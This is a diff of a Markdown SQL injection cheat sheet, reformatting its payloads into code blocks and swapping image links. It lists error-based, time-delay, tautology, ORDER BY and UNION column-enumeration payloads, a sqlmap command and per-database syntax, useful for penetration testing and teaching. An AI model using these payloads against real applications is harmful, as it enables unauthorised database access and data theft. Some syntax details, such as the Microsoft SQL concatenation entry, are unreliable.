@@ -1,15 +1,12 @@
 SQL Injection (SQLI)
 ====================
 
-## Overview
 
 SQL injection (SQLi) is a type of data and control confusion vulnerability which arises when client side elements are combined with SQL queries in an insecure fashion. SQLi typically occurs when an attacker can escape parameters in the query early to directly alter the syntax of the query. 
 
-## Anatomy of a SQL Query
+## Anatomy of a SQLI Payload
 
-### Vulnerable Login Query
-
-![SQL Query](./images/vuln_login_query_anatomy.png)
+![vuln_login_query_anatomy](https://user-images.githubusercontent.com/44337835/131428667-6e5dd6b6-31d8-4d91-a3e2-211d166ea1bd.png)
 
 
 ## Tooling
@@ -18,117 +15,199 @@ SQL injection (SQLi) is a type of data and control confusion vulnerability which
 
 + Completely blind SQLi testing tool
 
-#### Basic Scan
-
 `python3 sqlmap.py -u https://target.domain.com?param_to_test=1`
 
 ### [jSQL](https://github.com/ron190/jsql-injection#description)
+
++ Alternative to SQL map
 
 ## Basic Identification Payloads
 
 ### Error Based
 
-+ They payloads aim to create a malformed SQL query which violates the SQL syntax.
-+ If debugging messages are enabled these payloads will produce error messages or broken pages
+The following payloads aim to create a malformed SQL query which violates the SQL syntax. If debugging messages are enabled these payloads will produce error messages or broken pages.
 
-	`'`
+```sql
+'
+```
 
-	`"`
+```sql
+"
+```
 
-	`-- `
+```sql
+-- 
+```
 
-	`#`
+```sql
+#
+```
 
-	`,`
+```sql
+,
+```
 
-	`%`
+```sql
+%
+```
 
-#### Polyglot
-
-`'/**/"# -- `
+```sql
+'/**/"# -- 
+```
 
 ### Blind 
 
-`' sleep(5)#`
+The following would cause a vulnerable application to take an approximate `5` seconds longer than normal to return data (or no data) to the page.
 
-`" sleep(5)#`
+```sql
+' sleep(5)#
+```
 
-#### Polyglot
+```sql
+" sleep(5)#
+```
 
-`'" 1 or sleep(5)# -- `
+```sql
+'" 1 or sleep(5)# -- 
+```
  
 ## General Payloads
 
 ### Overflow Filter Conditions
 
-`' OR 1='1`
+These payloads aim to make applications which display the data returned from a query into some kind of element dynamically display more information then intended by defeating delimiters that formed part of the intended query.
 
-`' OR 1=1`
+```sql
+' OR 1='1
+```
 
-`" OR 1="1`
+```sql
+' OR 1=1
+```
 
-`" OR 1=1`
+```sql
+" OR 1="1
+```
 
-`' OR 'x'='x`
+```sql
+" OR 1=1
+```
 
-`' or "`
+```sql
+' OR 'x'='x
+```
 
-`-- or #`
+```sql
+' or "
+```
 
-`' OR '1` 
+```sql
+-- or #
+```
 
-`' OR 1 -- -`
+```sql
+' OR '1
+``` 
 
-`" OR "" = "`
+```sql
+' OR 1 -- -
+```
 
-`" OR 1 = 1 -- -`
+```sql
+" OR "" = "
+```
 
-`' OR '' = '`
+```sql
+" OR 1 = 1 -- -
+```
 
-`'LIKE'`
+```sql
+' OR '' = '
+```
 
-`' LIKE 1=1`
+```sql
+'LIKE'
+```
 
-`' LIKE 1`
+```sql
+' LIKE 1=1
+```
 
-`' HAVING 1=1`
+```sql
+' LIKE 1
+```
 
-`" HAVING 1=1`
+```sql
+' HAVING 1=1
+```
 
-`AND 1`
+```sql
+" HAVING 1=1
+```
 
-`AND 0`
+```sql
+AND 1
+```
 
-`AND true`
+```sql
+AND 0
+```
 
-`AND false`
+```sql
+AND true
+```
 
-`1-false`
+```sql
+AND false
+```
 
-`1-true`
+```sql
+1-false
+```
+
+```sql
+1-true
+```
 
 ### Order By && Group By Manipulation
 
-`" ORDER BY 1`
+```sql
+" ORDER BY 1
+```
 
-`' ORDER BY 1`
+```sql
+' ORDER BY 1
+```
 
-`" GROUP BY 1,2`
+```sql
+" GROUP BY 1,2
+```
 
-`' GROUP BY 1,2`
+```sql
+' GROUP BY 1,2
+```
 
-`' GROUP BY column_names having 1=1 --`
+```sql
+' GROUP BY column_names having 1=1 --
+```
 
 ### Blind/Time Delay Based
 
-`' sleep(5)`
+```sql
+' sleep(5)
+```
 
-`" sleep(5)`
+```sql
+" sleep(5)
+```
 
-`' or sleep(5)`
+```sql
+' or sleep(5)
+```
 
-`" or sleep(5)`
-
+```sql
+" or sleep(5)
+```
 
 ## Union Payloads
 
@@ -139,9 +218,7 @@ onto a legitimate query
 	+ Search results page
 + UNION based payloads require the exploiter to have knowledge of the number of columns referenced in the original query in order to craft a valid UNION statement
 
-### Anatomy of a UNION Payload
-
-![UNION payload diagram](./images/UNION_payload_diagram.png)
+![UNION_payload_diagram](https://user-images.githubusercontent.com/44337835/131428665-0e89e3d6-f13f-4f80-a1ef-e8df98484ac8.png)
 
 ### Column Number Enumeration
 
@@ -150,7 +227,7 @@ onto a legitimate query
 
 #### Order By Approach
 
-```
+```sql
 ' ORDER BY 1-- 
 ' ORDER BY 2-- 
 ' ORDER BY 3-- 
@@ -159,7 +236,7 @@ onto a legitimate query
 ```
 #### NULL Indexing
 
-```
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
@@ -199,9 +276,7 @@ onto a legitimate query
 	+ Many tools like SQLmap use this kind of approach
 + Alternatively an attacker can inject payloads and see which ones result in the page returning results or not
 
-### Anatomy of a Blind SQLi Payload
-
-![Anatomy Of a Blind SQLi payload diagram](./images/Blind_SQLi_Diagram.png)
+![Blind_SQLi_Diagram](https://user-images.githubusercontent.com/44337835/131428661-ecd15e14-81d1-4d25-87f5-e512a6ed6e3d.png)
 
 ### General Payloads
 
@@ -219,15 +294,15 @@ onto a legitimate query
 
 `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' `
 
-## Payload Utilities
+# Payload Utilities
 
 + SQL artifacts to place within payloads
 
-### SQL Comments 
+## SQL Comments 
 
-#### MySQL
+### MySQL
 
-```
+```sql
 #
 
 /*comment*/
@@ -236,9 +311,9 @@ onto a legitimate query
 
 ```
 
-#### SQLite
+### SQLite
 
-```
+```sql
 #
 
 /**/
@@ -246,72 +321,72 @@ onto a legitimate query
 --comment
 ```
 
-#### PostgreSQL
+### PostgreSQL
 
-```
+```sql
 --comment
 
 /*comment*/
 ```
 
-#### Microsoft SQL
+### Microsoft SQL
 
-```
+```sql
 --comment
 
 /*comment*/
 ```
 
-#### Oracle
+### Oracle
 
-```
+```sql
 --comment
 ```
 
-### Substrings
+## Substrings
 
-#### General Syntax
+### General Syntax
 
 `SUBSTRING('the_string', start_index, number_of_chars)`
 
-#### MySQL
+### MySQL
 
 `SUBSTRING('string', 1, 1)`
 
-#### PostgreSQL
+### PostgreSQL
 
 `SUBSTRING('string', 1, 1)`
 
-#### Oracle
+### Oracle
 
 `SUBSTR('string', 1, 1)`
 
-#### Microsoft
+### Microsoft
 
 `SUBSTRING ('string', 1,1)`
 
-### String Concatenation
+## String Concatenation
 
 + Join strings together
 	+ In some cases can be used to join columns
 
-#### MySQL
+### MySQL
 
 `CONCAT(str,ing)`
 
-#### PostgreSQL
+### PostgreSQL
 
 `'str'||'ING'`
 
-#### Oracle
+### Oracle
 
 `'str'||'ing'`
 
-#### Microsoft
+### Microsoft
 
 `'str'||'ing'`
 
-### CHAR Codes
+## CHAR Codes
 
 + [ASCII table](https://www.asciitable.xyz)
 
@@ -361,11 +436,7 @@ onto a legitimate query
 
 ### Bitwise Alternatives
 
-### OR Replacement
-
 `' || 1='1`
-
-### AND Replacement
 
 `' & 1='1'`
 
